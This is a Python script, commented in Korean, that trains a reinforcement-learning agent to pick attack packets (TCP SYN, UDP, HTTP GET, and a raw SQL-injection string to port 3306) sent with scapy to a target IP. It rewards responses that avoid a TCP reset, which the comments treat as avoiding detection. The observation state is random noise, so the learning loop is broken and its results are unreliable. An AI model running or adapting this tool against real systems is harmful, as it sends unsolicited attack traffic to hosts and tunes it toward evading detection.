import random
import numpy as np
import gym
from gym import spaces
import torch
import torch.nn as nn
import torch.optim as optim
from scapy.all import IP, TCP, UDP, send, sr1, RandShort

# =======================
# 강화학습 환경 정의
# =======================
class PacketAttackEnv(gym.Env):
    def __init__(self):
        super(PacketAttackEnv, self).__init__()

        self.dst_ip = "192.168.1.100"  # 공격 대상 서버 IP
        self.dst_ports = [22, 80, 443, 3306]  # 공격 대상 포트
        self.protocols = ['TCP', 'UDP']

        self.observation_space = spaces.Box(low=0, high=1, shape=(7,), dtype=np.float32)
        self.action_space = spaces.Discrete(4)  # 0: TCP SYN, 1: UDP, 2: HTTP GET, 3: SQLi

    def reset(self):
        self.step_count = 0
        return self._get_state()

    def _get_state(self):
        return np.array([
            random.random(),  # src_port entropy
            random.random(),  # dst_port encoding
            random.random(),  # protocol
            random.random(),  # packet_len
            random.random(),  # flag pattern
            random.random(),  # payload entropy
            random.random(),  # payload signature score
        ], dtype=np.float32)

    def step(self, action):
        reward = 0
        done = False
        self.step_count += 1

        if action == 0:
            pkt = IP(dst=self.dst_ip)/TCP(sport=RandShort(), dport=80, flags="S")
        elif action == 1:
            pkt = IP(dst=self.dst_ip)/UDP(sport=RandShort(), dport=3306)/("X"*10)
        elif action == 2:
            pkt = IP(dst=self.dst_ip)/TCP(sport=RandShort(), dport=80, flags="PA")/("GET /index.html HTTP/1.1\r\n\r\n")
        elif action == 3:
            pkt = IP(dst=self.dst_ip)/TCP(sport=RandShort(), dport=3306, flags="PA")/"' OR '1'='1"  # SQLi 시도

        response = sr1(pkt, timeout=1, verbose=0)

        if response is None:
            reward = 0.5
        elif response.haslayer(TCP) and response.getlayer(TCP).flags == 0x14:
            reward = -1  # RST 패킷: 탐지된 것으로 간주
        else:
            reward = 2  # 예상치 못한 응답: 잠재적 침투 성공

        obs = self._get_state()
        if self.step_count > 30:
            done = True
        return obs, reward, done, {}

# =======================
# 정책 신경망 정의
# =======================
class PolicyNetwork(nn.Module):
    def __init__(self, input_dim, output_dim):
        super(PolicyNetwork, self).__init__()
        self.model = nn.Sequential(
            nn.Linear(input_dim, 64),
            nn.ReLU(),
            nn.Linear(64, output_dim),
            nn.Softmax(dim=-1)
        )

    def forward(self, x):
        return self.model(x)

# =======================
# 학습 루프 (REINFORCE)
# =======================
def train():
    env = PacketAttackEnv()
    policy_net = PolicyNetwork(7, env.action_space.n)
    optimizer = optim.Adam(policy_net.parameters(), lr=0.01)
    
    for episode in range(100):
        log_probs = []
        rewards = []

        state = env.reset()
        done = False

        while not done:
            state_tensor = torch.FloatTensor(state)
            action_probs = policy_net(state_tensor)
            dist = torch.distributions.Categorical(action_probs)
            action = dist.sample()

            next_state, reward, done, _ = env.step(action.item())

            log_probs.append(dist.log_prob(action))
            rewards.append(reward)
            state = next_state

        # REINFORCE update
        G = 0
        returns = []
        for r in reversed(rewards):
            G = r + 0.99 * G
            returns.insert(0, G)
        returns = torch.tensor(returns)
        returns = (returns - returns.mean()) / (returns.std() + 1e-8)

        loss = 0
        for log_prob, Gt in zip(log_probs, returns):
            loss += -log_prob * Gt

        optimizer.zero_grad()
        loss.backward()
        optimizer.step()

        print(f"[Episode {episode}] Total Reward: {sum(rewards):.2f}")

if __name__ == '__main__':
    train()
